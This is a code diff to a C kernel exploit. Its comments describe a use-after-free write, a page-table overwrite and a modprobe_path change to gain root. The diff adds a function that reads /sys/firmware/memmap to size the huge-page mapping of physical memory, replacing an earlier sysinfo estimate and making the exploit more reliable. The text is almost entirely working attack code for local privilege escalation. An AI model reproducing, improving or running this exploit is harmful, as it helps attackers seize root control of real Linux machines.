@@ -28,7 +28,6 @@
 #include <sched.h>
 #include <sys/user.h>
 #include <sys/mman.h>
-#include <sys/sysinfo.h>
 #include <sys/socket.h>
 #include <sys/wait.h>
 #include <linux/if_alg.h>
@@ -139,6 +138,70 @@ int act(int act_fd, int code, int n, char *args)
  *  - perform uaf write using the dangling reference to the vulnerable object
  *  - change modprobe_path using the overwritten page table
  */
+
+#define GIB (1ULL << 30)
+
+unsigned int get_max_phys_gib(void)
+{
+	unsigned long long max_addr = 0;
+	unsigned long long addr = 0;
+	char buf[32] = { 0 };
+	char path[64] = { 0 };
+	ssize_t bytes = 0;
+	int fd = -1;
+	int i = 0;
+
+	for (i = 0;; i++) {
+		snprintf(path, sizeof(path), "/sys/firmware/memmap/%d/type", i);
+
+		fd = open(path, O_RDONLY);
+		if (fd < 0)
+			break;
+
+		bytes = read(fd, buf, sizeof(buf) - 1);
+		close(fd);
+		if (bytes <= 0) {
+			printf("[-] failed to read memmap type\n");
+			return 0;
+		}
+
+		buf[bytes] = 0;
+		if (strcmp(buf, "System RAM\n") != 0)
+			continue;
+
+		snprintf(path, sizeof(path), "/sys/firmware/memmap/%d/end", i);
+
+		fd = open(path, O_RDONLY);
+		if (fd < 0) {
+			perror("[-] open memmap end");
+			return 0;
+		}
+
+		bytes = read(fd, buf, sizeof(buf) - 1);
+		close(fd);
+		if (bytes <= 0) {
+			printf("[-] failed to read memmap end address\n");
+			return 0;
+		}
+
+		buf[bytes] = 0;
+		if (sscanf(buf, "%llx", &addr) != 1) {
+			printf("[-] invalid memmap end address\n");
+			return 0;
+		}
+
+		if (addr > max_addr)
+			max_addr = addr;
+	}
+
+	if (max_addr == 0) {
+		printf("[-] failed to read memmap RAM entries\n");
+		return 0;
+	}
+
+	/* Firmware memmap end addresses are inclusive. */
+	return max_addr / GIB + 1;
+}
 
 /* clang-format off */
 #define PTE_INDEX_TO_VIRT(i) ((unsigned long)i << 12)
@@ -552,18 +615,15 @@ int main(void)
 	long reserved_from_n = 0;
 	long uaf_n = 0;
 	unsigned long phys_addr = 0;
-	struct sysinfo info = { 0 };
 	int huge_pages_n = 0;
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
 
-	if (sysinfo(&info) != 0) {
-		perror("[!] sysinfo");
+	huge_pages_n = get_max_phys_gib();
+	if (!huge_pages_n)
 		goto end;
-	}
 
-	huge_pages_n = (info.totalram * info.mem_unit / 1024 / 1024 + 1023) / 1024;
-	printf("[!] physical memory can be addressed by %d GiB huge pages\n", huge_pages_n);
+	printf("[!] physical RAM upper bound: %d GiB\n", huge_pages_n);
 
 	ret = prepare_page_tables();
 	if (ret == EXIT_FAILURE)
